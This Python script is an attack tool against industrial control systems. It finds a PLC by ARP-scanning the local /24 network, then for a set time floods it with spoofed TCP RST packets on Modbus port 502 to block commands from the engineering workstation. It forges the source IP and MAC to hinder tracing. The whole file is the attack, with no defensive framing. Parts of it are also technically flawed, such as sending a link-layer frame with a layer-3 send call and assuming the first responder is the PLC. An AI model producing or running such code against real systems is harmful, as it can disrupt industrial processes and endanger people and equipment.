import socket
import scapy.all as scapy
import subprocess
import time
import sys
import os

# Configuration
PLC_IP = None  # Initially unknown, will be discovered
ATTACK_DURATION = 60  # Seconds to run the attack
INTERFACE = None  # Network interface to use for packet sniffing and sending (to be dynamically determined)

def get_default_gateway_linux():
    """
    Retrieves the default gateway IP address using the 'ip route' command on Linux.
    """
    try:
        output = subprocess.check_output(['ip', 'route'], stderr=subprocess.DEVNULL).decode('utf-8')
        for line in output.splitlines():
            if 'default via' in line:
                return line.split('via')[1].split()[0]
    except subprocess.CalledProcessError:
        return None
    return None


def get_network_interface(gateway_ip):
    """
    Determines the network interface used for the given gateway IP address.
    """
    try:
        # Use 'ip route get' to find the interface
        output = subprocess.check_output(['ip', 'route', 'get', gateway_ip], stderr=subprocess.DEVNULL).decode('utf-8')
        for line in output.splitlines():
            if 'dev' in line:
                return line.split('dev')[1].split()[0].strip()
    except subprocess.CalledProcessError:
        return None
    return None


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network.
    This is a simplified example and might need adjustments for different network setups.
    Uses ping sweep.
    """
    global PLC_IP, INTERFACE

    gateway_ip = get_default_gateway_linux()
    if not gateway_ip:
        print("Error: Could not determine the default gateway IP address.")
        return False

    INTERFACE = get_network_interface(gateway_ip)
    if not INTERFACE:
        print("Error: Could not determine the network interface.")
        return False

    # Determine the network address based on the gateway IP.  Simple assumption of /24 network.  Adjust as needed!
    network_address = gateway_ip.rsplit('.', 1)[0] + ".0/24"
    print(f"Scanning network {network_address} using interface {INTERFACE} to find the PLC...")

    try:
        arp_request = scapy.ARP(pdst=network_address)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, iface=INTERFACE)[0] #specify the interface
        print(f"ARP Scan completed.")

        for element in answered_list:
            # Add more specific identification logic here, e.g., checking MAC address OUI
            # or attempting to connect to a known port on the device.
            # This example simply assumes the first device found is the PLC.  BAD assumption in production!
            PLC_IP = element[1].psrc
            print(f"Possible PLC IP Address found: {PLC_IP}")
            return True
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return False


def block_command_message(target_ip, duration):
    """
    Blocks command messages to the PLC by flooding the network with TCP RST packets.
    This will disrupt communication between the engineering workstation and the PLC.
    This is a very basic and noisy attack and could easily be detected.  More sophisticated techniques exist.
    """

    # Define a fake MAC address to use as the source for our spoofed packets.  This makes it harder to trace back.
    fake_mac = "00:11:22:33:44:55"  # Replace with a random MAC (but valid format)
    try:
        print(f"Starting the attack. Blocking commands to {target_ip} for {duration} seconds...")
        start_time = time.time()
        while time.time() - start_time < duration:
            # Create a TCP RST packet to disrupt communication
            # This assumes you know or can guess the PLC's port.  A port scan would be needed to determine it.
            # Replace 502 with the actual port if different (e.g., Modbus/TCP usually uses 502)
            ip = scapy.IP(src="1.2.3.4", dst=target_ip)  # Spoof the source IP to avoid easy filtering.  Use something plausible.
            tcp = scapy.TCP(sport=12345, dport=502, flags="R") #Spoof source port, target Modbus port, RST flag
            packet = ip / tcp
            #Send packet on our interface. Use the fake MAC as the source MAC.
            scapy.send(packet, verbose=False, iface=INTERFACE)
            #Added Ether layer to specify the source MAC
            ether = scapy.Ether(src=fake_mac)
            packet_eth = ether/packet
            scapy.send(packet_eth, verbose=False, iface=INTERFACE)

            time.sleep(0.01)  # Send packets rapidly, but not so fast that it overwhelms the network.  Adjust as needed.
        print("Attack finished.")

    except KeyboardInterrupt:
        print("Attack stopped.")
    except Exception as e:
        print(f"Error during attack: {e}")



def main():
    global PLC_IP

    if not PLC_IP:
        if not find_plc_ip():
            print("Failed to discover PLC IP address.  Exiting.")
            sys.exit(1)
        print(f"Using discovered PLC IP: {PLC_IP}")

    if not PLC_IP:
        print("Please manually set the PLC_IP variable or ensure IP discovery is working.")
        sys.exit(1)

    block_command_message(PLC_IP, ATTACK_DURATION)


if __name__ == "__main__":
    #Ensure the script is run with root privileges.  Scapy requires root access.
    if os.geteuid() != 0:
        print("This script requires root privileges.  Please run as root.")
        sys.exit(1)
    main()